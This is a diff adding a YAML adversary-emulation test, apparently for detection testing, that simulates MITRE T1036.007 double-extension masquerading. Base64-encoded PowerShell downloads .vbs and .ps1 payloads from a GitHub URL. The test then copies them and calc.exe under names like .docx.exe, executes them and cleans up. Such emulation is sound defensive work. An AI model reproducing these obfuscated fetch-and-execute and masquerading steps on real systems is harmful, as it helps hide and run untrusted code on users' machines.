@@ -1,0 +1,53 @@
+- id: 1ec0753c-c590-5a0a-a386-520a80ce0f6f
+  name: Soumaia ART Tests - File Extension Masquerading
+  description: 'download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.
+
+
+    e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)'
+  tactic: stealth
+  technique:
+    attack_id: T1036.007
+    name: 'Masquerading: Double File Extension'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADMANgAuADAAMAA3AF8AbQBhAHMAcQB1AGUAcgBhAGQAaQBuAGcALgB2AGIAcwAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAAzADYALgAwADAANwBfAG0AYQBzAHEAdQBlAHIAYQBkAGkAbgBnAC4AdgBiAHMAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAwADMANgAuADAAMAA3AC8AcwByAGMALwBUADEAMAAzADYALgAwADAANwBfAG0AYQBzAHEAdQBlAHIAYQBkAGkAbgBnAC4AdgBiAHMAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAwADMANgAuADAAMAA3AF8AbQBhAHMAcQB1AGUAcgBhAGQAaQBuAGcALgB2AGIAcwAiAAoA
+          )
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAwADMANgAuADAAMAA3AF8AbQBhAHMAcQB1AGUAcgBhAGQAaQBuAGcALgBwAHMAMQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMAAzADYALgAwADAANwBfAG0AYQBzAHEAdQBlAHIAYQBkAGkAbgBnAC4AcABzADEAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAwADMANgAuADAAMAA3AC8AcwByAGMALwBUADEAMAAzADYALgAwADAANwBfAG0AYQBzAHEAdQBlAHIAYQBkAGkAbgBnAC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAwADMANgAuADAAMAA3AF8AbQBhAHMAcQB1AGUAcgBhAGQAaQBuAGcALgBwAHMAMQAiAAoA
+          )
+          copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.docx.exe /Y
+          copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.pdf.exe /Y
+          copy "C:\Windows\System32\calc.exe" %temp%\T1036.007_masquerading.ps1.exe /Y
+          copy ".\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.xls.vbs /Y
+          copy ".\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.xlsx.vbs /Y
+          copy ".\T1036.007_masquerading.vbs" %temp%\T1036.007_masquerading.png.vbs /Y
+          copy ".\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.doc.ps1 /Y
+          copy ".\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.pdf.ps1 /Y
+          copy ".\T1036.007_masquerading.ps1" %temp%\T1036.007_masquerading.rtf.ps1 /Y
+          %temp%\T1036.007_masquerading.docx.exe
+          %temp%\T1036.007_masquerading.pdf.exe
+          %temp%\T1036.007_masquerading.ps1.exe
+          %temp%\T1036.007_masquerading.xls.vbs
+          %temp%\T1036.007_masquerading.xlsx.vbs
+          %temp%\T1036.007_masquerading.png.vbs
+          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1
+          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1
+          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1
+        cleanup: |-
+          del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1
+          del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1
+        payloads:
+        - T1036.007_masquerading.ps1
+        - T1036.007_masquerading.vbs
